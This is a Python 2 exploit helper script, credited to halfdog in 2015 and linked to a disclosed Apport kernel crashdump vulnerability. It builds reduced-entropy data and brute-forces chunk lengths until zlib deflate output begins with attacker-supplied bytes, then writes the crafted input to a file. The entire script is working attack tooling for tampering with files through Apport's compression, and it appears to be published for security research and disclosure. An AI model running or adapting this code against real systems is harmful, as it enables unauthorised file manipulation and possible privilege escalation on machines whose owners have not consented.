#!/usr/bin/python -u
# This software is provided by the copyright owner "as is" and any
# expressed or implied warranties, including, but not limited to,
# the implied warranties of merchantability and fitness for a particular
# purpose are disclaimed. In no event shall the copyright owner be
# liable for any direct, indirect, incidential, special, exemplary or
# consequential damages, including, but not limited to, procurement
# of substitute goods or services, loss of use, data or profits or
# business interruption, however caused and on any theory of liability,
# whether in contract, strict liability, or tort, including negligence
# or otherwise, arising in any way out of the use of this software,
# even if advised of the possibility of such damage.
#
# Copyright (c) 2015 halfdog <me (%) halfdog.net>
#
# Create data with reduced entropy followed by a last chunk and
# optimize length of the last chunk to be flushed. The data was
# selected to trigger dynamic huffman encoding and still fill
# up all the encoder literal and length code tables. This will
# guarantee that we can use the full encoder alphabet also in
# deflate step, which is useful to speed up optimization.
#
# See http://www.halfdog.net/Security/2015/ApportKernelCrashdumpFileAccessVulnerabilities/ for more information.

import base64
import random
import sys
import zlib

targetData=base64.b64decode(sys.argv[1])

codeLengthTable={257: (0, 3), 258: (0, 4), 259: (0, 5), 260: (0, 6), 261: (0, 7), 262: (0, 8), 263: (0, 9), 264: (0, 10), 265: (1, 11), 266: (1, 13), 267: (1, 15), 268: (1, 17), 269: (2, 19), 270: (2, 23), 271: (2, 27), 272: (2, 31), 273: (3, 35), 274: (3, 43), 275: (3, 51), 276: (3, 59), 277: (4, 67), 278: (4, 83), 279: (4, 99), 280: (4, 115), 281: (5, 131), 282: (5, 163), 283: (5, 195), 284: (5, 227), 285: (0, 258)}
codeLengthValues=codeLengthTable.values()


def stringToHex(str):
  return "".join([hex(ord(c))[2:].zfill(2) for c in str])


randFile=open('/dev/urandom', 'rb')
baseData=randFile.read((1<<20))
randFile.close()


logNonUniformDistributedBytes=b''
for cVal in range(0, 256):
  if (cVal&0x3f)==0: logNonUniformDistributedBytes+=logNonUniformDistributedBytes
  logNonUniformDistributedBytes+=chr(cVal)
uniformDistributedBytes=logNonUniformDistributedBytes

reducedEntropyRandomData=b''
nextByteValue=0
for value in baseData:
  nextByteValue=((nextByteValue<<8)|ord(value))&0xffffff
  reducedEntropyRandomData+=uniformDistributedBytes[nextByteValue%len(uniformDistributedBytes)]
# Add repeats to fill up the length code table also.
  if (nextByteValue&0xff00)==0:
    testLength=codeLengthValues[random.randint(0, len(codeLengthValues)-1)][1]
    addonData=reducedEntropyRandomData[-3:]
    while testLength>len(addonData): addonData+=addonData
    reducedEntropyRandomData+=addonData[:testLength]
reducedEntropyRandomData=reducedEntropyRandomData[-(1<<20):]

zeroBlock=b'\x00'*(1<<20)

insertCount=58400
while True:
  reducedEntropyRandomData=reducedEntropyRandomData[-23:]+reducedEntropyRandomData[:-23]

  print "Count %d" % insertCount
  testTail=reducedEntropyRandomData[-insertCount:]

  testData=zeroBlock[:-len(testTail)]+testTail

  bc=zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS, zlib.DEF_MEM_LEVEL, 0)
  firstChunk=bc.compress(testData)
  if not firstChunk:
    insertCount+=1
    continue
  lastChunk=bc.flush()
  print "%d-Tail %x-%s (%d) last %d %s (%s)" % (insertCount, ord(firstChunk[0]), base64.b64encode(firstChunk)[0:12], len(firstChunk), len(lastChunk), stringToHex(lastChunk)[0:12], base64.b64encode(lastChunk)[0:12])
  if len(lastChunk)<1000:
    bestMatchingBits=0

    modData=None
    try:
      bd=zlib.decompressobj(-zlib.MAX_WBITS)
      modData=bd.decompress(firstChunk)
      modData+=bd.decompress(targetData+lastChunk[len(targetData):])
    except:
      modData=None

    if (modData!=None) and (len(modData)>=(1<<20)):
      bc=zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS, zlib.DEF_MEM_LEVEL, 0)
      modFirstChunk=bc.compress(modData[:(1<<20)])
      modLastChunk=bc.compress(modData[(1<<20):])+bc.flush()
      if(modLastChunk.startswith(targetData)):
        print >>sys.stderr, "Good result: %s" % base64.b64encode(modLastChunk)
        resultFile=open('result', 'wb')
        resultFile.write(testData)
        resultFile.close()
        sys.exit(0)
  elif len(lastChunk)<10000:
    insertCount-=100
    continue
  else:
    insertCount+=1
    continue
  insertCount+=1
